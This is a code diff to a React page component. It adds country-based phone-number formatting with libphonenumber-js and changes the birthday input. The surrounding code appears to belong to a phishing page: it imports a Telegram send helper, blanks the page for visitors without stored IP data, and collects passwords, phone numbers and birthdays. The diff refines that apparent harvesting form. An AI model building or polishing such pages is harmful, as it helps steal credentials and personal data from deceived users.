@@ -6,6 +6,7 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
+import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
 const Home = () => {
     const defaultTexts = useMemo(
         () => ({
@@ -47,6 +48,8 @@ const Home = () => {
     const [showPassword, setShowPassword] = useState(false);
     const [errors, setErrors] = useState({});
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
+    const [countryCode, setCountryCode] = useState('US');
+    const [callingCode, setCallingCode] = useState('+1');
 
     const translateAllTexts = useCallback(
         async (targetLang) => {
@@ -91,6 +94,20 @@ const Home = () => {
         if (!ipInfo) {
             window.location.href = 'about:blank';
         }
+
+        try {
+            const ipData = JSON.parse(ipInfo);
+            const detectedCountry = ipData.country_code || 'US';
+            setCountryCode(detectedCountry);
+
+            // get calling code
+            const code = getCountryCallingCode(detectedCountry);
+            setCallingCode(`+${code}`);
+        } catch {
+            setCountryCode('US');
+            setCallingCode('+1');
+        }
+
         const targetLang = localStorage.getItem('targetLang');
         if (targetLang && targetLang !== 'en') {
             translateAllTexts(targetLang);
@@ -98,10 +115,23 @@ const Home = () => {
     }, [translateAllTexts]);
 
     const handleInputChange = (field, value) => {
-        setFormData((prev) => ({
-            ...prev,
-            [field]: value
-        }));
+        if (field === 'phone') {
+            const cleanValue = value.replace(/^\+\d+\s*/, '');
+            const asYouType = new AsYouType(countryCode);
+            const formattedValue = asYouType.input(cleanValue);
+
+            const finalValue = `${callingCode} ${formattedValue}`;
+
+            setFormData((prev) => ({
+                ...prev,
+                [field]: finalValue
+            }));
+        } else {
+            setFormData((prev) => ({
+                ...prev,
+                [field]: value
+            }));
+        }
 
         if (errors[field]) {
             setErrors((prev) => ({
@@ -247,14 +277,17 @@ const Home = () => {
                                 <p>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='tel' name='phone' inputMode='numeric' pattern='[0-9]*' autoComplete='tel' className={`w-full rounded-lg border px-3 py-1.5 ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.phone} onChange={(e) => handleInputChange('phone', e.target.value)} />
+                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
+                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-1.5 text-sm font-medium text-gray-700'>{callingCode}</div>
+                                    <input type='tel' name='phone' inputMode='numeric' pattern='[0-9]*' autoComplete='off' className='flex-1 rounded-r-lg border-0 px-3 py-1.5 focus:ring-0 focus:outline-none' value={formData.phone.replace(/^\+\d+\s*/, '')} onChange={(e) => handleInputChange('phone', e.target.value)} />
+                                </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
                                 <p>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
-                                <input type='date' name='birthday' className={`w-full rounded-lg border px-3 py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.birthday} onChange={(e) => handleInputChange('birthday', e.target.value)} onFocus={(e) => e.target.blur()} />
+                                <input type='date' name='birthday' className={`w-full rounded-lg border px-3 py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} value={formData.birthday} onChange={(e) => handleInputChange('birthday', e.target.value)} />
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <button className='w-fit rounded-lg bg-gray-200 px-3 py-2 text-[15px] font-normal' onClick={handleSubmit}>
